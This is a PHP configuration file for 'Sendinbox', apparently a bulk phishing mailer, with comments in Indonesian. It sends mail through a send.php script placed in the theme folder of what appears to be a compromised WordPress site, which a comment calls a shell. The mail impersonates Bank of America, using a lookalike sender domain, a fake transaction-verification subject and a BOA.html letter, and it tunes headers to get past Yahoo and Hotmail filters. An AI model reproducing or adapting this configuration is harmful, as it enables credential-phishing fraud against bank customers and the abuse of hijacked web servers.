<?php
/**
 * @Author: Eka Syahwan
 * @Date:   2018-08-30 16:54:08
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2018-09-02 04:49:19
 */
class Sendinbox_config
{
	public function server(){

		$config['server']['multy'][] = 'https://marthashands.com/wp-content/themes/twentynine/send.php';

		return $config;
	}
	public function sender(){

		$config['config']['threads'] 			= 1;  				// kirim [value] dalam satu permintaan.
		$config['config']['delay'] 				= 30;  				// [value] delay dalam detik. 
		$config['config']['color'] 				= true;				// aktifkan color atau tidak.
		$config['config']['time_zone'] 			= 'Asia/Kuala_Lumpur'; 	// zona waktu pengiriman.
		$config['config']['charset'] 			= 'ascii'; 			// charset (default utf-8)
		$config['config']['domain_fromemail'] 	= true; 			// Menganti domain from email dengan domain server (shell).

		return $config;
	}
	public function message(){

		$config['message']['multy']['from'][] 		= array('name' => 'Notice of Policy Updates' , 'email' => 'noreply-{textrandom,20,2}@idmsa-bankofamerica.com');

		$config['message']['multy']['subject'][] 	= 'Bank of America - Verification of Transactions and Right to Reverse Transactions.';
		
		$config['message']['multy']['letter'][] 	= 'BOA.html';

		return $config;
	}
	public function header(){
		$config_sender = $this->sender(); // don't remove
		/* Yahoo  */
		$config['header']['MIME-Version'] 				= '1.0'; 
		$config['header']['Content-type'] 				= 'text/html; charset='.$config_sender['config']['charset'];
		$config['header']['Content-Transfer-Encoding'] 	= '7bit';
		$config['header']['Mailer'] 					= 'Sendinbox Mailer';

		/* Killer hotmail */









		return $config;
	}
}



